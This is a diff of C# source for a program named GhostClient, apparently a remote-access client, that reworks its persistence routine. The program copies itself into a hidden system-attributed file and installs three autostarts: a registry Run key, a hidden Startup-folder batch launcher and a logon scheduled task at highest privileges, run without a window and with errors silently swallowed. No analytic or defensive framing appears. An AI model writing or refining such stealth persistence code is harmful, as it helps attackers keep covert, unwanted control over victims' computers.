@@ -528,28 +528,33 @@ namespace GhostClient
                 // Only copy if not already in persistence dir
                 if (!exePath.ToLower().Contains(_persistDir.ToLower()))
                 {
+                    // Kill the destination file if running, then copy
+                    try { File.Delete(destExe); } catch { }
                     try { File.Copy(exePath, destExe, true); } catch { }
-                    // Set hidden attribute
+                    // Set hidden+system attributes
                     try { File.SetAttributes(destExe, FileAttributes.Hidden | FileAttributes.System); } catch { }
-                    // Add to registry Run
-                    try { Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", INSTALL_NAME, "\"" + destExe + "\""); } catch { }
-                    // Add shortcut to Startup folder
+                    
+                    // Registry Run key (most reliable)
+                    try { Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", INSTALL_NAME, "\"" + destExe + "\""); } catch { }
+                    
+                    // Startup folder - copy .bat launcher
                     try
                     {
                         string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                        string shortcutPath = Path.Combine(startupDir, INSTALL_NAME + ".url");
-                        using (StreamWriter sw = new StreamWriter(shortcutPath))
+                        string batPath = Path.Combine(startupDir, INSTALL_NAME + ".bat");
+                        using (StreamWriter sw = new StreamWriter(batPath, false))
                         {
-                            sw.WriteLine("[InternetShortcut]");
-                            sw.WriteLine("URL=file:///" + destExe.Replace("\\", "/"));
-                            sw.WriteLine("IconIndex=0");
-                            sw.WriteLine("IconFile=" + destExe.Replace("\\", "/"));
+                            sw.WriteLine("@echo off");
+                            sw.WriteLine("start \"\" /B \"" + destExe + "\"");
                         }
+                        try { File.SetAttributes(batPath, FileAttributes.Hidden); } catch { }
                     } catch { }
-                    // Schedule task for re-execution (backup)
+                    
+                    // Scheduled task (admin-level backup)
                     try
                     {
-                        Process.Start(new ProcessStartInfo("schtasks.exe", "/create /tn \"" + INSTALL_NAME + "\" /tr \"\\\"" + destExe + "\\\"\" /sc onlogon /f /rl highest") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
+                        string taskCmd = "/create /tn \"" + INSTALL_NAME + "\" /tr \"\\\"" + destExe + "\\\"\" /sc onlogon /f /rl highest";
+                        Process.Start(new ProcessStartInfo("schtasks.exe", taskCmd) { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                     } catch { }
                 }
             } catch { }
